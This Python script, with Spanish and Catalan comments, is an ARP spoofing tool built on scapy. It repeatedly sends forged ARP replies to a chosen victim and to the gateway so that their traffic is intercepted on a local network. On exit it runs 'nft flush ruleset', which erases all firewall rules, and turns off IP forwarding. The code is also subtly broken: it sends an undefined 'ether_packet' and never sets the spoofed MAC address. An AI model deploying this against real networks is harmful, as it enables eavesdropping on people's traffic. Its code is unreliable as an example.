#!/usr/bin/env python3

import sys
import time
import signal
import argparse
import subprocess
import scapy.all as scapy
from colorama import Fore
from argparse import RawDescriptionHelpFormatter
from modules.my_utils import show_message, get_gateway, get_own_mac, get_mac

### Variables & Constants #################################################################################################

ROUTER_IP = ""     # Ip del Router
MY_MAC = ""        # Mac del Router
VICTIM_MAC = ""    # Mac de  la victima

### Functions #############################################################################################################

def def_handler(sig, frame):
    show_message("Exiting the program...", "error")
    disable_rules()
    sys.exit(1)

def get_arguments():
    parser = argparse.ArgumentParser(description = ("ARP Spoofer"))
    parser.add_argument("-t", "--target", required=True, dest="target", help="Victima o victimas para envenenar")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Interfaz de red a envenenar")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=MY_MAC)
    scapy.sendp(ether_packet, verbose=False)

def command_execute(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    except:
        pass

def disable_rules():
    # Borra les regles de nftables
    command_execute("nft flush ruleset")
    
    # Deshabilita l'encaminament
    # Si el vols tenir activat sempre comenta les linies que fan referencia a l'encaminament
    command_execute("sysctl -w net.ipv4.ip_forward=0")

### Main Code #######################################################################################################################

def main():
    
    try:

        signal.signal(signal.SIGINT, def_handler)
        show_message("Executing:", "info", "Arp Spoof")

        arguments = get_arguments()
        interface = arguments.interface

        ROUTER_IP = get_gateway()
        print(ROUTER_IP)

        input()

        # Per sortir del bucle es surt amb Ctrl + C
        while True:
            spoof(arguments.target, ROUTER_IP)
            spoof(ROUTER_IP, arguments.target)

    except PermissionError:
        show_message("You need to be SuperUser to perform this script", "error")
        sys.exit(1)

if __name__ == "__main__":
    main()
